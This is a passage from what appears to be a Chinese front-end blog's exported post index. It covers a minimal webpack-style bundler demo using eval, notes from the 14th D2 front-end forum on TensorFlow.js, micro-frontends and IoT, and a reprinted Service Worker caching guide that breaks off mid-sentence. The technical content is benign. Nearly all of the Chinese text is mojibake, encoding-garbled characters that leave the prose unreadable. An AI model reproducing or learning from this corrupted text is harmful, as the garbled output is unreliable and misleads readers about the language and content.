å¯¹è±¡12345678910111213141516171819202122232425262728293031// å®šä¹‰ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°,ä¼ å…¥ç”Ÿæˆçš„ä¾èµ–å…³ç³»å›¾;(function(graph) &#123; // é‡å†™requireå‡½æ•° function require(moduleId) &#123; // æ‰¾åˆ°å¯¹åº”moduleIdçš„ä¾èµ–å¯¹è±¡,è°ƒç”¨requireå‡½æ•°,evalæ‰§è¡Œ,æ‹¿åˆ°exportså¯¹è±¡ function localRequire(relativePath) &#123; return require(graph[moduleId].dependecies[relativePath]) // &#123;__esModule: true, say: Æ’ say(name)&#125; &#125; // å®šä¹‰exportså¯¹è±¡ var exports = &#123;&#125; ;(function(require, exports, code) &#123; // commonjsè¯­æ³•ä½¿ç”¨module.exportsæš´éœ²å®ç°,æˆ‘ä»¬ä¼ å…¥çš„exportså¯¹è±¡ä¼šæ•è·ä¾èµ–å¯¹è±¡(hello.js)æš´éœ²çš„å®ç°(exports.say = say)å¹¶å†™å…¥ eval(code) &#125;)(localRequire, exports, graph[moduleId].code) // æš´éœ²exportså¯¹è±¡,å³æš´éœ²ä¾èµ–å¯¹è±¡å¯¹åº”çš„å®ç° return exports &#125; // ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  è¿™ä¸‹åº”è¯¥æ˜ç™½äº†å§ ~ å¯ä»¥ç›´æ¥å¤åˆ¶ä¸Šé¢ä»£ç åˆ°æ§åˆ¶å°è¾“å‡ºå“¦~ å®Œæ•´ä»£ç åœ°å€æˆ³æˆ‘ ğŸ‘ˆ æ€»ç»“ Webpack æ˜¯ä¸€ä¸ªåºå¤§çš„ Node.js åº”ç”¨,å¦‚æœä½ é˜…è¯»è¿‡å®ƒçš„æºç ,ä½ ä¼šå‘ç°å®ç°ä¸€ä¸ªå®Œæ•´çš„ Webpack éœ€è¦ç¼–å†™éå¸¸å¤šçš„ä»£ç ã€‚ ä½†ä½ æ— éœ€äº†è§£æ‰€æœ‰çš„ç»†èŠ‚,åªéœ€äº†è§£å…¶æ•´ä½“æ¶æ„å’Œéƒ¨åˆ†ç»†èŠ‚å³å¯ã€‚ å¯¹ Webpack çš„ä½¿ç”¨è€…æ¥è¯´,å®ƒæ˜¯ä¸€ä¸ªç®€å•å¼ºå¤§çš„å·¥å…·ï¼› å¯¹ Webpack çš„å¼€å‘è€…æ¥è¯´,å®ƒæ˜¯ä¸€ä¸ªæ‰©å±•æ€§çš„é«˜ç³»ç»Ÿã€‚ Webpack ä¹‹æ‰€ä»¥èƒ½æˆåŠŸ,åœ¨äºå®ƒæŠŠå¤æ‚çš„å®ç°éšè—äº†èµ·æ¥,ç»™ç”¨æˆ·æš´éœ²å‡ºçš„åªæ˜¯ä¸€ä¸ªç®€å•çš„å·¥å…·,è®©ç”¨æˆ·èƒ½å¿«é€Ÿè¾¾æˆç›®çš„ã€‚ åŒæ—¶æ•´ä½“æ¶æ„è®¾è®¡åˆç†,æ‰©å±•æ€§é«˜,å¼€å‘æ‰©å±•éš¾åº¦ä¸é«˜,é€šè¿‡ç¤¾åŒºè¡¥è¶³äº†å¤§é‡ç¼ºå¤±çš„åŠŸèƒ½,è®© Webpack å‡ ä¹èƒ½èƒœä»»ä»»ä½•åœºæ™¯ã€‚ å‚è€ƒwebpack ä¸­æ–‡æ–‡æ¡£ æ·±å…¥æµ…å‡º webpack]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ’åº]]></title>
    <url>%2F2020%2F01%2F07%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%2F%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[å‚è€ƒæ–‡æ¡£ åå¤§ç»å…¸æ’åºç®—æ³•]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„ä¸ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æ•°æ®ç»“æ„ä¸ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[14 å±Š D2 å‰ç«¯æŠ€æœ¯è®ºå›æœ‰æ„Ÿ]]></title>
    <url>%2F2019%2F12%2F19%2FWeb%E5%89%8D%E7%AB%AF%2F14%20%E5%B1%8A%20D2%20%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF%E8%AE%BA%E5%9D%9B%E6%9C%89%E6%84%9F%2F</url>
    <content type="text"><![CDATA[æ‰˜è€æ¿ç¦å¶å¾—D2é—¨ç¥¨ä¸€å¼ ï¼Œå‘¨æœ«æœ‰å¹¸å‚åŠ äº†ç¬¬ 14 å±Š D2 å‰ç«¯æŠ€æœ¯è®ºå›ï¼Œæ•´ä½“ä½“éªŒéå¸¸æ£’ã€‚å‰ç«¯æ˜¯ä¸€ä¸ªå…¥é—¨é—¨æ§›æä½ï¼Œè€Œå¤©èŠ±æ¿æé«˜çš„è¡Œä¸šï¼Œé‡å¤æœºæ¢°åœ°â€œç³Šé¡µé¢â€å·²ç»è¿œè¿œä¸èƒ½æ»¡è¶³éªšåŠ¨çš„æŠ€æœ¯å†…å¿ƒï¼Œæˆ‘ä»¬æ¸´æœ›æˆé•¿ï¼Œå¯»æ±‚çªç ´ï¼Œå§‘ä¸”è·ŸéšD2 å‰ç«¯è®ºå›æ¥çœ‹æ·±æ°´åŒºå‰ç«¯çš„è‡ªæˆ‘æ•‘èµã€‚ TensorFlow 9012 å¹´äº†ç®—æ³•æ¨èå·²æ·±å…¥äººå¿ƒï¼Œâ€œçŒœä½ å–œæ¬¢â€ä¹Ÿè®©äººå˜å¾—è¶Šæ¥è¶Šå–œæ¬¢ã€‚éšç€ tensorFlow.js ä¸æ–­å®Œå–„ï¼Œæ¨¡å‹è¶Šæ¥è¶Šä¸°å¯Œï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒ python æ¨¡å‹è½¬æ¢ï¼Œå‰ç«¯æ™ºèƒ½æ­£åœ¨æˆä¸ºä¸€ä¸ªç‚™æ‰‹å¯çƒ­çš„è¯é¢˜ã€‚å°è±¡æœ€æ·±çš„æ˜¯å…¶ä¸­ä¸€ä¸ªæ¬§è±é›…åŸºäº tensorFlow.js æ¨¡å‹çš„å£çº¢è¯•è£…å°ç¨‹åºï¼Œç›®å‰è‡ªå·±ä¹Ÿåœ¨åšä¸€äº›â€œç«¯æ™ºèƒ½â€ç›¸å…³ç”¨æˆ·è¡Œä¸ºå®æ—¶æ¨èçš„äº‹æƒ…ï¼Œä½†ä¸»è¦è¿˜ä¾èµ–ç«¯ä¸Š sdk è·‘ python æ¨¡å‹ï¼Œåœ¨æ”¯ä»˜å®ç­‰ç«¯å¤– h5 åœºæ™¯æ²¡æœ‰ç«¯ sdk çš„åŠ æŒï¼ŒåŒæ ·ä¾èµ–å‰ç«¯æ™ºèƒ½å€ŸåŠ© tensorFlow.js åœ¨æœ¬åœ°æ¶ˆè´¹æ¨¡å‹ï¼Œåç»­æˆ‘ä»¬ä¹Ÿä¼šåœ¨è¿™å—é‡ç‚¹è·Ÿè¿›ã€‚ å¾®å‰ç«¯èš‚èšé‡‘æœçš„æœ‰çŸ¥åˆ†äº«äº†â€æ ‡å‡†å¾®å‰ç«¯æ¶æ„åœ¨èš‚èšçš„è½åœ°å®è·µâ€ ï¼Œä¸»è¦å†…å®¹å‚è§â€œå¯èƒ½æ˜¯ä½ è§è¿‡æœ€å®Œå–„çš„å¾®å‰ç«¯è§£å†³æ–¹æ¡ˆâ€ã€‚ç›®å‰å·²æœ‰éå¸¸å¤šçš„â€å¾®å‰ç«¯â€æ–¹æ¡ˆï¼Œç¤¾åŒºçš„ single-spaï¼Œèš‚èšçš„ qiankun ï¼ˆåŸºäº single-spaï¼‰ï¼Œé£å†°çš„ icestark ï¼ˆâ€œICE åœ¨å¾®å‰ç«¯çš„æ¢ç´¢â€ï¼‰ç­‰ï¼Œä½†æ®Šé€”åŒå½’ï¼Œä¸ªäººè®¤ä¸ºå¾®å‰ç«¯æœ¬è´¨è§£å†³çš„é—®é¢˜ï¼šå¦‚ä½•è§£æ„å·¨çŸ³åº”ç”¨ï¼Œæ–¹æ¡ˆä¸Šåšåˆ°æŠ€æœ¯æ ˆæ— å…³ï¼Œä½¿ç”¨ä¸Šåšåˆ° iframe ä¸€æ ·ç®€å•åˆè§£å†³ iframe çš„å„ç§ä½“éªŒé—®é¢˜ã€‚ä¸ªäººä¹ŸæœŸå¾…åœ¨æ‰€è´Ÿè´£ä¸šåŠ¡çš„ä¸­åå°åº”ç”¨ä¸­å®è·µ qiankun å¾®å‰ç«¯æ–¹æ¡ˆï¼Œä¸å®è·µæ— çœŸç†ã€‚ å¼•ç”¨æœ‰çŸ¥çš„ä¸€æ®µè¯ï¼ˆå‡ºè‡ªï¼šå¾®å‰ç«¯çš„æ ¸å¿ƒä»·å€¼ï¼‰æ€»ç»“ï¼š å¾®å‰ç«¯é¦–å…ˆè§£å†³çš„ï¼Œæ˜¯å¦‚ä½•è§£æ„å·¨çŸ³åº”ç”¨ï¼Œä»è€Œè§£å†³å·¨çŸ³åº”ç”¨éšç€æŠ€æœ¯æ›´è¿­ã€äº§å“å‡çº§ã€äººå‘˜æµåŠ¨å¸¦æ¥çš„å·¥ç¨‹ä¸Šçš„é—®é¢˜ã€‚è§£æ„ä¹‹åè¿˜éœ€è¦å†é‡ç»„ï¼Œé‡ç»„çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å°±ä¼šç¢°åˆ°å„ç§ éš”ç¦»æ€§ã€ä¾èµ–å»é‡ã€é€šä¿¡ã€åº”ç”¨ç¼–æ’ ç­‰é—®é¢˜ã€‚åœ¨è§£å†³äº†è¿™äº›é—®é¢˜ä¹‹åï¼Œæ‰æ˜¯äº§å“çš„è‡ªç”±ç»„åˆã€widget è¾“å‡ºç­‰èƒ½åŠ›ã€‚åŒæ—¶ç”±äºæœ‰äº†å‰è€…èƒ½åŠ›çš„é“ºå«å’ŒåŠ æŒï¼Œè¿™äº›äº§å“ä¸Šçš„ä»·å€¼æå‡ä¹Ÿå°±å˜å¾—å¾ˆè‡ªç„¶å’Œå®¹æ˜“ã€‚ IOT è¿‘å‡ å¹´ç‰©è”ç½‘çš„å‘¼å£°å¾ˆé«˜ï¼Œä¸‡ç‰©äº’è”çš„ç†æƒ³æ­£åœ¨ä¸€æ­¥ä¸€æ­¥ç…§è¿›ç°å®ï¼Œå‰ç«¯æ‰‹æ¡æ— æ‰€ä¸èƒ½çš„ JavaScript ç´ æœ‰å¼€å‘æ•ˆç‡å¥‡é«˜çš„åŠŸæ•ˆï¼Œåœ¨ Iot é¢†åŸŸä¹Ÿæ­£æ”»åŸç•¥åœ°ã€‚ä¸è¿‡å‰ç«¯çœŸçš„è¦æƒ³æŠ“ä½ Iot çš„å¥‘æœºå¹¶ä¸å®¹æ˜“ï¼Œä¸ªäººè®¤ä¸ºï¼Œæˆ‘ä»¬éœ€è¦æ‹“å±•çš„çŸ¥è¯†é¢è¾ƒå¤šï¼Œå—é™è®¾å¤‡åº•å±‚ç”±åµŒå…¥å¼ cã€c++ ä»£ç æ— å¯é¿å…ã€å—é™è®¾å¤‡ç«¯å®¹å™¨æŠ€æœ¯ä¼˜åŒ–ç­‰ç­‰ï¼Œæ— ä¸å†²å‡»ç€ç°æœ‰å‰ç«¯æŠ€æœ¯æ ˆï¼Œä»…ä»…æ‰‹æ¡ JavaScript è¿˜è¿œè¿œä¸å¤Ÿã€‚ æ•´ä½“æ„Ÿå—ï¼šå·å¾—æµ®ç”ŸåŠæ—¥é—²ï¼Œçœ‹æ·±æ°´å‰ç«¯ç™¾å®¶äº‰é¸£ï¼Œå¾è¾ˆå…±å‹‰ã€‚å³ä½¿æ—¥å¸¸å·¥ä½œä½å¾®è€Œç¹çï¼Œä¸è¦æ”¾å¼ƒå­¦ä¹ å’ŒåŠæ—¶å……ç”µï¼Œè·Ÿä¸Šæ—¶ä»£çš„æ½®æµæ‰èƒ½æ°¸ä¸è½ä¼ã€‚ å‚è€ƒæ–‡æ¡£ ICE åœ¨å¾®å‰ç«¯çš„æ¢ç´¢ å¯èƒ½æ˜¯ä½ è§è¿‡æœ€å®Œå–„çš„å¾®å‰ç«¯è§£å†³æ–¹æ¡ˆ]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Service Workeræœ€ä½³å®è·µ]]></title>
    <url>%2F2019%2F12%2F04%2FWeb%E5%89%8D%E7%AB%AF%2FService%20Worker%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ª TBS è…¾è®¯æµè§ˆæœåŠ¡ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://x5.tencent.com/tbs/guide/serviceworker.html 1 Service Workerä»‹ç»Service Workeræ˜¯ä¸€é¡¹æ¯”è¾ƒæ–°çš„WebæŠ€æœ¯ï¼Œæ˜¯Chromiumå›¢é˜Ÿåœ¨å¸æ”¶äº†ChromePackaged Appçš„Event Pageæœºåˆ¶ï¼ŒåŒæ—¶å¸å–äº†HTML5 AppCacheæ ‡å‡†å¤±è´¥çš„æ•™è®­ä¹‹åï¼Œæå‡ºä¸€å¥—æ–°çš„W3Cè§„èŒƒï¼Œæ—¨åœ¨æé«˜WebAppçš„ç¦»çº¿ç¼“å­˜èƒ½åŠ›ï¼Œç¼©å°WebAppä¸NativeAppä¹‹é—´å·®è·ã€‚ Service Workerä»è‹±æ–‡ç¿»è¯‘è¿‡æ¥å°±æ˜¯ä¸€ä¸ªæœåŠ¡å·¥äººï¼ŒæœåŠ¡äºå‰ç«¯é¡µé¢çš„åå°çº¿ç¨‹ï¼ŒåŸºäºWeb Workerå®ç°ã€‚æœ‰ç€ç‹¬ç«‹çš„Javascriptè¿è¡Œç¯å¢ƒï¼Œåˆ†æ‹…ã€ååŠ©å‰ç«¯é¡µé¢å®Œæˆå‰ç«¯å¼€å‘è€…åˆ†é…çš„éœ€è¦åœ¨åå°æ‚„æ‚„æ‰§è¡Œçš„ä»»åŠ¡ã€‚åŸºäºå®ƒå¯ä»¥å®ç°æ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚ã€æ¶ˆæ¯æ¨é€ã€é™é»˜æ›´æ–°ã€äº‹ä»¶åŒæ­¥ç­‰æœåŠ¡ã€‚ X5å†…æ ¸ä½œä¸ºWebViewæä¾›ç»™ä¸åŒappä½¿ç”¨ï¼Œå…·å¤‡Service Workerç½‘ç»œæ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œé…åˆCacheStorageå¯ä»¥å®ç°webé¡µé¢çš„ç¼“å­˜ç®¡ç†ä»¥åŠä¸å‰ç«¯é€šè¿‡PostMessageé€šä¿¡ã€‚ 2 Service Workerå·¥ä½œåŸç†Service WorkeræŠ€æœ¯æ ¸å¿ƒæ˜¯Service Workerè„šæœ¬ï¼Œå®ƒ æ˜¯ä¸€ç§ç”±Javascriptç¼–å†™çš„æµè§ˆå™¨ç«¯ä»£ç†è„šæœ¬ã€‚ å‰ç«¯é¡µé¢å‘å†…æ ¸å‘èµ·æ³¨å†Œæ—¶ä¼šå°†è„šæœ¬åœ°å€é€šçŸ¥å†…æ ¸ï¼Œå†…æ ¸ä¼šå¯åŠ¨ç‹¬ç«‹è¿›/çº¿ç¨‹åŠ è½½Service Workerè„šæœ¬å¹¶æ‰§è¡ŒService Workerå®‰è£…åŠæ¿€æ´»åŠ¨ä½œã€‚æˆåŠŸæ¿€æ´»åä¾¿è¿›å…¥ç©ºé—²ç­‰å¾…çŠ¶æ€ï¼Œè‹¥å½“å‰çš„Service Workerè¿›/çº¿ç¨‹ä¸€ç›´æ²¡æœ‰ç®¡è¾–çš„é¡µé¢æˆ–è€…äº‹ä»¶æ¶ˆæ¯æ—¶ä¼šè‡ªåŠ¨ç»ˆæ­¢ï¼ˆå…·ä½“çš„ç»ˆæ­¢ç­–ç•¥è§†ä¸åŒæµè§ˆå™¨åŠç‰ˆæœ¬è€Œå®šï¼Œä¸ä¼šå½±å“å‰ç«¯ç¼–å†™é€»è¾‘ï¼Œä½†å‰ç«¯å‹¿åœ¨Service Workerè„šæœ¬ä¸­ä¿å­˜éœ€è¦æŒä¹…åŒ–çš„ä¿¡æ¯ï¼Œå¯ä»¥å€ŸåŠ©localstorageï¼‰ï¼Œå½“æ‰“å¼€æ–°çš„å¯ç®¡è¾–é¡µé¢æˆ–è€…å·²ç®¡è¾–é¡µé¢å‘èµ·messageç­‰æ¶ˆæ¯æ—¶ï¼ŒService Workerè¿›/çº¿ç¨‹ä¼šè¢«é‡æ–°å”¤èµ·ã€‚ æ¯å½“å·²å®‰è£…çš„Service Workeræœ‰ç®¡è¾–é¡µé¢è¢«æ‰“å¼€æ—¶ï¼Œä¾¿ä¼šè§¦å‘Service Workerè„šæœ¬æ›´æ–°ï¼Œå½“ä¸Šæ¬¡è„šæœ¬æ›´æ–°å†™å…¥Service Workeræ•°æ®åº“çš„æ—¶é—´æˆ³ä¸æœ¬æ¬¡æ›´æ–°è¶…è¿‡24å°æ—¶ï¼Œä¾¿ä¼šå¿½ç•¥æœ¬åœ°ç½‘ç»œcacheçš„Service Workerè„šæœ¬ç›´æ¥ä»ç½‘ç»œæ‹‰å–ã€‚è‹¥ç½‘ç»œæ‹‰å–çš„ä¸æœ¬åœ°æœ‰ä¸€ä¸ªå­—èŠ‚çš„å·®å¼‚éƒ½ä¼šè§¦å‘Service Workerè„šæœ¬çš„æ›´æ–°ï¼Œæ›´æ–°æµç¨‹ä¸å®‰è£…ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ›´æ–°å®‰è£…æˆåŠŸåä¸ä¼šç«‹å³è¿›å…¥activeçŠ¶æ€ï¼Œéœ€è¦ç­‰å¾…æ—§ç‰ˆæœ¬çš„Service Workerè¿›/çº¿ç¨‹ç»ˆæ­¢ã€‚ 3 Service Workerå¼€å‘è°ƒè¯•æ–¹æ³•æœ‰è¿‡ä½¿ç”¨chrome inspectå‰ç«¯é¡µé¢è°ƒè¯•ç»éªŒå¯¹äºService Workerå¼€å‘è°ƒè¯•å°±å¾ˆå®¹æ˜“ä¸Šæ‰‹äº†ï¼Œä»¥ offline-page ä¸ºä¾‹ï¼š ä½¿ç”¨pc chromeæµè§ˆå™¨ï¼ˆæœ€å¥½æ˜¯M53ä»¥åç‰ˆæœ¬ï¼‰æ‰“å¼€ä¸Šè¿°é¡µé¢åï¼ŒæŒ‰F12é”®è¿›å…¥inspectè°ƒè¯•æ¨¡å¼å â€‹ å•å‡»å›¾2 inspectè°ƒè¯•ç•Œé¢ä¸­çš„1åŠ2åä¼šå‡ºç°å½“å‰é¡µé¢åŸŸä¸‹çš„æ‰€æœ‰Service Workerï¼Œåœ¨å•å‡»6å°±ä¼šè¿›å…¥å›¾3ç•Œé¢ï¼Œè¿™ä¸ªæ—¶å€™è°ƒè¯•Service Workerè„šæœ¬å°±å¦‚è°ƒè¯•å‰ç«¯é¡µé¢jsä¸€æ ·ï¼Œå¯ä»¥éšæ„åœ¨Service Workerè„šæœ¬ä¸­ä¸‹æ–­ç‚¹ã€‚å¦‚æœåœ¨fetchç›‘å¬äº‹ä»¶ä¸­æ‰“ä¸Šæ–­ç‚¹ï¼Œå½“é¡µé¢åˆ·æ–°æˆ–è€…é¡µé¢ä¸­æœ‰å…¶å®ƒè¯·æ±‚æ—¶ä¾¿ä¼šåˆ°è¾¾Service Workerçº¿ç¨‹ï¼Œä½¿å¾—Service Workerè„šæœ¬ä¸­çš„fetchäº‹ä»¶æ‰§è¡Œè¢«ä¸­æ–­ï¼Œè¿™æ—¶å¯ä»¥å°†é¼ æ ‡ç§»åŠ¨åˆ°fetchäº‹ä»¶ä¸­çš„eventä¸Šä¾¿å¯ä»¥çœ‹åˆ°æ˜¯ä»€ä¹ˆæ ·çš„è¯·æ±‚ã€è¯·æ±‚çš„urlç­‰ ã€‚ å¯¹äºä¸€äº›è¾ƒä¸ºå¤æ‚çš„é¡µé¢ï¼Œå¾€å¾€ä¼šæœ‰ä¸€éƒ¨åˆ†èµ„æºä½¿ç”¨æœ¬åœ°cacheï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†ä»ç„¶éœ€è¦æ˜¯æ—¶æ‹‰å–ï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‹¾é€‰å›¾2ä¸­çš„3ã€4æ¥å¿«é€Ÿè¾¾åˆ°å½“å‰tabé¡µç¦»çº¿å’Œè·³è¿‡Service Workeræ‹¦æˆªã€‚ åœ¨ä¹‹å‰çš„åŸç†ä¸­è¯´è¿‡ï¼ŒService Workerä¼šåœ¨æ¯æ¬¡æ‰“å¼€å¯¹åº”çš„é¡µé¢åå»æ£€æŸ¥æ›´æ–°Service Workerè„šæœ¬ï¼Œä½†å¦‚æœService Workerè„šæœ¬æœ‰ç¼“å­˜æœŸé™çš„è¯ï¼Œé‚£ä¹ˆåœ¨å¼€å‘è°ƒè¯•çš„æ—¶å€™ä¿®æ”¹äº†æµ‹è¯•é¡µé¢çš„Service Workerè„šæœ¬å¹¶pushåˆ°æµ‹è¯•é¡µé¢æœåŠ¡å™¨ä¸Šä¹‹åï¼Œåˆ·æ–°é¡µé¢å¹¶ä¸èƒ½ç«‹å³å»ç½‘ç»œæ›´æ–°è„šæœ¬ï¼Œç»™å¼€å‘è°ƒè¯•å¸¦æ¥éº»çƒ¦ï¼Œä½†å›¾2ä¸­çš„5å¯ä»¥å¸®åŠ©å¼€å‘å¼ºè¡Œå¿½ç•¥æœ¬åœ°Service Workerè„šæœ¬cacheï¼Œå®æ—¶çš„å»ç½‘ç»œæ›´æ–°ã€‚ Service Workerå¯ä»¥ç¼“å­˜èµ„æºï¼Œç‚¹å‡»å›¾2ä¸­çš„7ä¾¿å¯ä»¥çœ‹åˆ°å›¾4å±•ç¤ºï¼Œè¡¨æ˜äº†å½“å‰æµè§ˆå™¨å¯¹å½“å‰é¡µé¢çš„èµ„æºç¼“å­˜æƒ…å†µï¼Œå¯ä»¥é€šè¿‡é¼ æ ‡å³é”®ç‰¹å®šèµ„æºå¯¹èµ„æºè¿›è¡Œåˆ é™¤æ“ä½œã€‚ æœ€åæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æµè§ˆå™¨ä¸­è¾“å…¥chrome://serviceworker-internalsæ¥äº†è§£å½“å‰æµè§ˆå™¨ä¸­æ‰€æœ‰å·²å®‰è£…Service Workerçš„è¯¦ç»†æƒ…å†µï¼ŒInstallation StatusåŠRunning Statuså±•ç¤ºå½“å‰Service Workerå®‰è£…çŠ¶æ€åŠè¿è¡ŒçŠ¶æ€ï¼ŒVersion IDä¸ºå…¶åœ¨å½“å‰æ•°æ®åº“ä¸­çš„ä¸€ä¸ªåˆ†é…åˆ°çš„ç‰ˆæœ¬å·ï¼Œåç»­Service Workerè„šæœ¬å‡çº§ï¼Œç‰ˆæœ¬å·ä¹Ÿä¼šä¸€èµ·æå‡ã€‚ 4 ä½¿ç”¨Service Workerè¿›è¡Œèµ„æºç¼“å­˜4.1 ä½¿ç”¨Service Workerè¿›è¡Œç®€å•çš„èµ„æºç¼“å­˜è¿˜æ˜¯ä»¥ offline-page ä¸ºä¾‹ï¼Œå‰ç«¯åœ¨åŸæ¥çš„webåº”ç”¨ä¸­ä½¿ç”¨Service Workeråªéœ€è¦ä¸‰å¤§æ­¥ 1ã€åˆ‡å…¥åˆ°httpsï¼›ç”±äºService Workerå¯ä»¥åŠ«æŒè¿æ¥ï¼Œä¼ªé€ å’Œè¿‡æ»¤å“åº”ï¼Œæ‰€ä»¥ä¿è¯å…¶åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¢«ç¯¡æ”¹éå¸¸é‡è¦ã€‚ 2ã€åœ¨é¡µé¢åŠ è½½çš„æ°å½“æ—¶æœºæ³¨å†ŒService Workerï¼›ç¤ºä¾‹ä¸­åœ¨indexé¡µé¢çš„body onloadäº‹ä»¶ä¸­æ³¨å†Œäº†åŒpathä¸‹çš„service-worker.jsä½œä¸ºindexé¡µé¢çš„æœåŠ¡çº¿ç¨‹è„šæœ¬ã€‚ 3ã€ç¼–å†™serviceworkerè„šæœ¬é€»è¾‘ï¼›serviceworkeræ˜¯äº‹ä»¶é©±åŠ¨å‹æœåŠ¡çº¿ç¨‹ï¼Œæ‰€ä»¥serviceworkerè„šæœ¬é€»è¾‘ä¸­åŸºæœ¬éƒ½æ˜¯ä»¥äº‹ä»¶ç›‘å¬ä½œä¸ºé€»è¾‘å…¥å£ï¼Œç¤ºä¾‹ä¸­åœ¨serviceworkerè„šæœ¬è¢«å®‰è£…çš„installäº‹ä»¶ä¸­ç¼“å­˜indexé¡µé¢ä¸»èµ„æºåŠå­èµ„æºï¼Œ åœ¨æ¿€æ´»äº‹ä»¶activateç›‘å¬äº‹ä»¶ä¸­æ¸…é™¤å†å²ç¼“å­˜ï¼Œåœ¨è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯caches.keyséå†çš„æ˜¯å½“å‰åŸŸä¸‹æ‰€æœ‰çš„cacheï¼Œå¯èƒ½åŒåŸŸä¸‹çš„å…¶å®ƒpathä¹Ÿä½¿ç”¨äº†Service Workerè¿›è¡Œèµ„æºç¼“å­˜ï¼Œç›´æ¥å¦‚å›¾æ‰€ä¸ºï¼Œå¯èƒ½ä¼šè¯¯åˆ é™¤ã€‚ åœ¨fetchäº‹ä»¶ä¸­ï¼Œæ‹¦æˆªå‰ç«¯é¡µé¢å‘èµ·çš„èµ„æºè¯·æ±‚å¹¶åˆ°ä¹‹å‰ç¼“å­˜çš„cacheä¸­åŒ¹é…ã€‚å…¶ä¸­åŠ ä¸Šå®¹é”™å¤„ç†ï¼Œå½“å‘ç°ç¼“å­˜ä¸­æ— å½“å‰æ‰€è¦è¯·æ±‚çš„èµ„æºæ—¶ï¼ŒæŠ˜å›ç½‘ç»œè¯·æ±‚ã€‚ 4.2 æ·±å…¥äº†è§£Service Workerèµ„æºçš„å‡ ç§ç¼“å­˜ç­–ç•¥äº†è§£Service Workerèµ„æºçš„å‡ ç§ç¼“å­˜ç­–ç•¥æ˜¯ä½¿ç”¨å¥½Service Workerè¿›è¡Œèµ„æºç¼“å­˜çš„åŸºç¡€ï¼Œå®é™…åº”ç”¨åœºæ™¯ä¼šæ˜¯å‡ ç§ç¼“å­˜ç­–ç•¥çš„é›†åˆã€‚ 4.2.1 ä¸å½±å“å®‰è£…çš„èµ„æºé¢„ç¼“å­˜ å¯¹äºæŸäº›å›ºå®šä¸å˜çš„é™æ€èµ„æºï¼Œæˆ‘ä»¬ä¹ æƒ¯åœ¨Service Workeråˆæ¬¡å®‰è£…çš„installäº‹ä»¶ä¸­å°†å…¶ç¼“å­˜ï¼Œä½†èµ„æºè¿‡å¤§æˆ–è€…ç½‘ç»œä¸ä½³éƒ½ä¼šé€ æˆèµ„æºå¹¶æœªå…¨éƒ¨ä¸‹è½½æˆåŠŸè€Œå¯¼è‡´Service Workerå®‰è£…è¢«ä¸­æ–­ï¼Œåªæœ‰ç­‰ä¸‹æ¬¡ç”¨æˆ·åœ¨æ‰“å¼€ç›¸åº”é¡µé¢ã€‚è¿™é‡Œå¯ä»¥å°†é™æ€èµ„æºæŒ‰ä¼˜å…ˆçº§åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯é‡è¦èµ„æºï¼Œä¸€ç±»æ˜¯éé‡è¦èµ„æºï¼Œå°†é‡è¦èµ„æºæ”¾åˆ°å®‰è£…ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼Œéé‡è¦èµ„æºæ”¾åˆ°ç‹¬ç«‹çš„é˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·åªéœ€è¦é‡è¦èµ„æºå…¨éƒ¨éƒ½åŠ è½½æˆåŠŸå°±å¯ä»¥æˆåŠŸå®‰è£…Service Workeräº†ï¼Œå¯ä»¥æé«˜Service Workerå®‰è£…æˆåŠŸç‡ã€‚ offline-page-not-dependent-on-install 4.2.2 æ¸è¿›å¼ç¼“å­˜ å¯¹äºåœ¨installä¸­å‘ç°æ²¡æœ‰ç¼“å­˜ï¼Œé¡µé¢åˆä¾èµ–ä½†åˆä¸ç»å¸¸å˜åŒ–çš„èµ„æºï¼Œå¯ä»¥åœ¨é¡µé¢æ‰“å¼€æˆ–å‘ç”Ÿç”¨æˆ·äº¤äº’æ—¶è§¦å‘fetchç„¶åä½¿ç”¨fetch apiå†å»ç½‘ç»œæ‹‰å–ï¼Œå°†è¿”å›æ­£å¸¸çš„responseç¼“å­˜èµ·æ¥ä»¥ä¾¿ä¸‹æ¬¡ä½¿ç”¨ã€‚ progressive-cache 4.2.3 ä»…ä½¿ç”¨ç¼“å­˜ åœ¨fetchäº‹ä»¶ä¸­ï¼Œä»…å»åŒ¹é…èµ„æºï¼Œè‹¥åŒ¹é…å¤±è´¥ï¼Œè¡¨ç°å‡ºæ¥çš„å°±æ˜¯å‰ç«¯é¡µé¢å¯¹äºè¯¥ 